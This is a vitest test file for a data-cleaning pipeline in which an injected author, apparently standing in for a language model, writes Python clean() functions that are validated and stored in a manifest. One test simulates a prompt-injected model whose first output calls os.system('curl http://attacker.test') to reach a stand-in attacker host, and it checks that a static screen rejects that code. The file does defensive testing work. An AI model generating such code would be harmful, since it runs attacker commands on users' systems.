import { describe, it, expect, afterEach } from 'vitest';
import * as fs from 'fs'; import * as os from 'os'; import * as path from 'path';
import { pythonAvailable } from '../../src/cleaning/exec.js';
import { buildCleanManifest, applyManifest, cleanDataset } from '../../src/cleaning/manifest.js';
import { buildAuthorPrompt, type CleanAuthor } from '../../src/cleaning/author.js';

const py = pythonAvailable() ? describe : describe.skip;
let tmp: string;
afterEach(() => { if (tmp) fs.rmSync(tmp, { recursive: true, force: true }); });

// A deterministic FAKE author — no model. Proves authoring is injected, and the
// core builds+validates+materializes around it.
const fakeAuthor: CleanAuthor = async (req) => {
  expect(buildAuthorPrompt(req).system).toMatch(/def clean\(value\)/); // prompt is shared knowledge
  return 'import datetime\ndef clean(value):\n    if not value: return None\n    return datetime.datetime.strptime(value, "%m/%d/%Y").strftime("%Y-%m-%d")';
};

py('cleaning manifest pipeline (injected author, no model)', () => {
  it('discovers a non-ISO date hazard, validates the fix, materializes a cleaned CSV (raw kept)', async () => {
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'clean-mf-'));
    const raw = path.join(tmp, 'games.csv');
    fs.writeFileSync(raw, 'saledate,team\n9/2/1966,A\n1/15/2012,B\n3/4/1999,C\n7/20/2001,D');
    const { cleanedPath, manifest } = await cleanDataset(raw, fakeAuthor, { outDir: tmp });
    expect(manifest.fixes.some((f) => f.column === 'saledate' && f.validated)).toBe(true);
    const out = fs.readFileSync(cleanedPath, 'utf8');
    expect(out).toMatch(/1966-09-02/);   // cleaned
    expect(out).toMatch(/saledate_raw/);          // original preserved
    expect(out).toMatch(/9\/2\/1966/);     // raw value still present
  });

  it('Tier-1: a malicious authored fix is screened out, the loop retries, a safe fix is stored', async () => {
    // Simulates the real orchestrator threat: a prompt-injected model emits exfil code on
    // its first attempt. The shared executor's static screen must reject it (CleanRejected),
    // the author loop must treat that as failed validation and retry, and ONLY the safe fix
    // may be stored. Proves injection→RCE cannot reach a materialized manifest.
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'clean-evil-'));
    const raw = path.join(tmp, 'games.csv');
    fs.writeFileSync(raw, 'saledate,team\n9/2/1966,A\n1/15/2012,B\n3/4/1999,C\n7/20/2001,D');
    const legit = 'import datetime\ndef clean(value):\n    if not value: return None\n    return datetime.datetime.strptime(value, "%m/%d/%Y").strftime("%Y-%m-%d")';
    const evil = "import os\ndef clean(value):\n    os.system('curl http://attacker.test'); return value";
    let calls = 0;
    const attacker: CleanAuthor = async () => { calls++; return calls === 1 ? evil : legit; };
    const { manifest } = await cleanDataset(raw, attacker, { outDir: tmp });
    expect(calls).toBeGreaterThanOrEqual(2);                 // first (evil) rejected → retried
    const fix = manifest.fixes.find((f) => f.column === 'saledate');
    expect(fix?.validated).toBe(true);
    expect(fix?.pythonCode).not.toMatch(/os\.system|import os/); // the stored fix is the SAFE one
  });

  it('REPLAY (applyManifest) re-cleans new rows with no author call', () => {
    const manifest = { dataset: 'x', createdBy: 'fake', createdAt: '', fixes: [
      { column: 'd', issue: 'non-iso-date', task: '', validated: true, summary: '',
        pythonCode: 'import datetime\ndef clean(value):\n    if not value: return None\n    return datetime.datetime.strptime(value, "%m/%d/%Y").strftime("%Y-%m-%d")' },
    ] };
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'clean-rp-'));
    const raw = path.join(tmp, 'more.csv');
    fs.writeFileSync(raw, 'd\n12/25/2025');
    const { rows } = applyManifest(raw, manifest as any);
    expect(rows[0].d).toBe('2025-12-25');
    expect(rows[0].d_raw).toBe('12/25/2025');
  });
});
